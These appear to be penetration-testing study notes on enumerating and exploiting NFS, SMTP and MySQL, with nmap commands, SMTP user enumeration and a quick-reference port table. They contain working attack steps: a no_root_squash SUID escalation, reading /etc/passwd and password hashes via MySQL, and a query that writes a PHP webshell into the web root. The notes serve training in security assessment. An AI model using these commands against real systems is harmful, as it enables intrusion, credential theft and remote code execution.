# Network Services 2

Focuses on

- NFS
- SMTP
- MySQL

Workflow

Identify → Enumerate → Research → Exploit → Document

Always enumerate before exploiting

---

## NFS (Network File System)

Used to share directories between Linux/Unix systems

Remote folders behave like local folders

Ports

2049/TCP (NFS)

111/TCP,UDP (RPC Portmapper)

---

## Why NFS Matters

Uses UID/GID for access control

Doesn't rely on usernames/passwords

If client UID matches server UID

Access is granted

Trusts the client more than the user

---

## NFS Enumeration

### Nmap

```bash
nmap -p 111,2049 -sV -sC <target>
```

More detailed

```bash
nmap --script nfs-showmount,nfs-ls <target>
```

---

### showmount

Lists exported directories

```bash
showmount -e <target>
```

Shows

- Shared directories
- Allowed hosts

If you see `*`

Anyone can mount the share

---

## Mounting an NFS Share

Create mount point

```bash
mkdir /mnt/nfs
```

Mount share

```bash
sudo mount -t nfs <target>:/export/path /mnt/nfs -o nolock
```

Browse normally

```bash
ls -la /mnt/nfs
```

---

## no_root_squash

### Root Squash

Default behavior

Remote root becomes an unprivileged user

Prevents remote root from acting as server root

---

### no_root_squash

Remote root stays root

Very dangerous

Can lead to privilege escalation

---

## NFS Exploitation

If `no_root_squash` is enabled

1. Mount the share
2. Create a SUID binary as root
3. Execute it on the target
4. Gain root privileges

Shows why trusting UID is dangerous

---

## SMTP (Simple Mail Transfer Protocol)

Used to send emails

Ports

25/TCP

587 (Mail Submission)

465 (SMTPS)

Main focus

Port 25

---

## Why SMTP Matters

Can reveal valid usernames

Supports commands like

VRFY

EXPN

Useful for reconnaissance

Collected usernames can be used for brute-force attacks

---

## SMTP Enumeration

### Nmap

```bash
nmap -p 25 -sV -sC --script smtp-commands,smtp-enum-users,smtp-open-relay <target>
```

Useful scripts

smtp-commands

Lists supported SMTP commands

smtp-enum-users

Checks valid usernames

smtp-open-relay

Checks open relay

---

### Manual Connection

```bash
telnet <target> 25
```

or

```bash
nc <target> 25
```

---

## Common SMTP Commands

HELO / EHLO

Start session

MAIL FROM

Sender address

RCPT TO

Recipient address

DATA

Start email body

Ends with

.

VRFY

Checks if a user exists

EXPN

Expands mailing lists

---

## SMTP User Enumeration

Example

```bash
smtp-user-enum -M VRFY -U users.txt -t <target>
```

Options

-M

Method

(VRFY, EXPN or RCPT)

-U

Username list

-t

Target

---

## SMTP Exploitation

SMTP usually isn't exploited directly

Instead

Find valid usernames

Use them against

- SSH
- FTP
- Web Logins

---

## MySQL

Relational Database Management System

Common backend for web applications

Port

3306/TCP

---

## Why MySQL Matters

Common issues

- Blank passwords
- Weak passwords
- Root accessible remotely

With enough privileges

Can read and write files

Can lead to Remote Code Execution

---

## MySQL Enumeration

### Nmap

```bash
nmap -p 3306 -sV -sC --script mysql-info,mysql-enum-users,mysql-empty-password <target>
```

Useful scripts

mysql-info

Database version

mysql-enum-users

Lists users

mysql-empty-password

Checks blank passwords

---

### Connect Manually

```bash
mysql -h <target> -u root -p
```

Try blank password first

Then common passwords

---

## Useful SQL Commands

Show databases

```sql
SHOW DATABASES;
```

Select database

```sql
USE database_name;
```

Show tables

```sql
SHOW TABLES;
```

View table

```sql
SELECT * FROM table_name;
```

View MySQL users

```sql
SELECT user,authentication_string FROM mysql.user;
```

---

## MySQL Exploitation

### Read Files

Requires FILE privilege

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Reads system files

---

### Write Files

Requires FILE privilege

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Creates a PHP webshell

Can lead to Remote Code Execution

---

### UDF (User Defined Functions)

Advanced technique

Can execute OS commands from MySQL

Requires write access and enough privileges

---

## Quick Reference

| Service | Port | Enumeration | Exploitation |
|----------|------|-------------|--------------|
| FTP | 21 | ftp, Nmap | Anonymous login, Hydra, Version backdoors |
| Telnet | 23 | telnet, Nmap | Default creds, Hydra |
| SMTP | 25 | smtp-user-enum, Nmap | User enumeration |
| RPC | 111 | rpcinfo, Nmap | Discover NFS services |
| SMB | 139,445 | enum4linux, smbclient, smbmap | Open shares, Samba CVEs |
| MySQL | 3306 | mysql client, Nmap | Blank creds, LOAD_FILE, INTO OUTFILE |
| NFS | 2049 | showmount, mount | no_root_squash privilege escalation |

---

## Important Commands

NFS

```bash
showmount -e <target>
```

```bash
sudo mount -t nfs <target>:/share /mnt/nfs -o nolock
```

---

SMTP

```bash
telnet <target> 25
```

```bash
smtp-user-enum -M VRFY -U users.txt -t <target>
```

---

MySQL

```bash
mysql -h <target> -u root -p
```

---

## Important Points

NFS

Trusts UID/GID

`no_root_squash` can lead to root privilege escalation

---

SMTP

Used to enumerate usernames

Useful for attacks against other services

---

MySQL

Weak credentials are common

FILE privilege allows reading and writing files

Can lead to Remote Code Execution

---

Overall Workflow

Identify service

Enumerate

Research version

Exploit misconfiguration or known vulnerability

Document everything